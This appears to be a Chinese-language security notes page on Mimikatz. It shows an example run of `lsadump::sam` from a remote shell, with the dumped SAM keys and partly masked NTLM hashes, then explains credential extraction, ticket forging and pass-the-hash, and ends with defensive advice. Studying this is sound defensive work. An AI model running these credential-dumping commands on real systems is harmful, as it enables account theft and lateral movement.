# mimikatz
**Mimikatz** 是一套功能非常多的 Windows 憑證與認證工具，能從記憶體、憑證庫、Kerberos 與加密容器提取或操作多種認證材料（明文密碼、NTLM hash、Kerberos ticket、憑證、DPAPI 資料等），也能用來模擬/注入憑證以達到「通行」或維持存取。它常被紅隊、資安研究員與數位鑑識用於合法測試或調查，但也常遭惡意攻擊者濫用。

## 使用範例
### get ntlm
執行 mimikatz  
成功取得 ntlm
```bash
RCE_SHELL$ mimikatz "lsadump::sam" exit

  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 5...1

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 3...0

mimikatz(commandline) # exit
Bye!
```


## 說明

### 主要功能（概念性說明）

1. **從 LSASS（Local Security Authority Subsystem Service）擷取憑證/密碼**

   * 能讀取正在運行的 LSASS 進程記憶體以取得：明文密碼（如果存在）、NTLM/LM hash、Kerberos ticket 等。這是很多 lateral movement（側向移動）/維持存取攻擊的核心來源。
   * 結果形式可以是明文、hash、或 ticket。

2. **Kerberos 相關操作（ticket 操作）**

   * 能提取、建立或注入 Kerberos ticket（如 TGT/TGS），包含所謂的 *Golden Ticket*（長期有效的票證，讓攻擊者冒充任意帳號）與 *Silver Ticket*（針對某服務的票證）。
   * 也可以把已取得的票證「注入」到目前 session（pass-the-ticket），讓攻擊者以該票證進行存取。

3. **Pass-the-Hash（PtH）與 Pass-the-Ticket（PtT）概念支援**

   * 將擷取到的 NTLM hash 或 Kerberos ticket 用於其他系統的認證（概念上），不需要原始明文密碼即可進行認證。

4. **憑證與私鑰管理**

   * 能列出/匯出儲存在使用者或機器的憑證與私鑰（例如 Windows certificate store、PFX），以及用這些憑證執行認證或簽章相關動作。
   * 可用來發現濫用的憑證或進行憑證橫向移動。

5. **DPAPI（Data Protection API）資料解密**

   * Windows 的 DPAPI 用來保護密碼/密鑰（例如瀏覽器或服務的儲存密碼）。Mimikatz 可以在有足夠資訊（例如使用者憑證或系統金鑰）的情況下解密 DPAPI 保護的資料。

6. **SAM/NTDS（離線或匯出）解析**

   * 可以協助解析本地 SAM 或 AD 的 NTDS.dit（domain database）等檔案中的 hash（通常在法證/離線分析時使用）。

7. **Kerberos/service ticket forging（偽造票證）**

   * 能夠用已知的密鑰或金鑰材料建構偽造票證，進而冒充服務或使用者。

8. **Creds 輸出與轉換（各種格式）**

   * 能把擷取的憑證或 hash 轉成不同工具能用的格式（方便其他攻防工具接續使用）。

9. **模擬/繞過認證機制**

   * 包含一些用於測試的功能，例如模擬使用者登入流程、測試憑證驗證等（在合法情境中用於防護檢測）。

10. **其他輔助功能**

    * 列舉登入 session、rundown token、檢查 LSA 等內部資料結構；某些版本支援與 smartcard、ts (RDP) 有關的操作等。

---

### 合法用途 vs. 濫用風險

* **合法用途**：紅隊評估、滲透測試（有授權）、資安研究、數位鑑識/事件回應（用來找出攻擊者是否已經取得帳密、還原受害者的憑證流）。
* **濫用**：攻擊者在擷取到系統權限後常用它取得更多憑證、橫向移動、長期維持存取（persistence）、冒充其他帳號或建立後門。

---

### 防護與檢測建議（實務面、非指令）

1. **啟用 LSA 保護與 Windows Defender Credential Guard**（降低或阻止 LSASS 記憶體被存取）。
2. **限制高權限帳號使用**（避免長期使用 Domain Admin 進行日常作業）。
3. **使用多因素認證（MFA）**，減少單一憑證被盜用的效果。
4. **監控可疑行為**：如非預期的 LSASS 讀取、異常 Kerberos ticket 生成、憑證匯出行為、異常的網路 lateral movement。
5. **採用 EDR / 記憶體完整性檢測**：現代 EDR 能發現 Mimikatz 的常見行為特徵或記憶體注入跡象。
6. **及時打補丁與最小權限原則**：修補已知漏洞並限制可執行檔在不該執行的主機上執行。

---

### 小結（一句話）

Mimikatz 不只是「拿 NTLM」——它是一套針對 Windows 認證機制（LSASS、Kerberos、憑證、DPAPI 等）的探索、提取、與操作工具，能讓擁有足夠權限的人把憑證資源轉化為更廣泛、更持久的存取權；在資訊安全上既是有力的測試/鑑識工具，也是被攻擊者濫用的關鍵工具。




## 參考
- https://github.com/ParrotSec/mimikatz/tree/master/Win32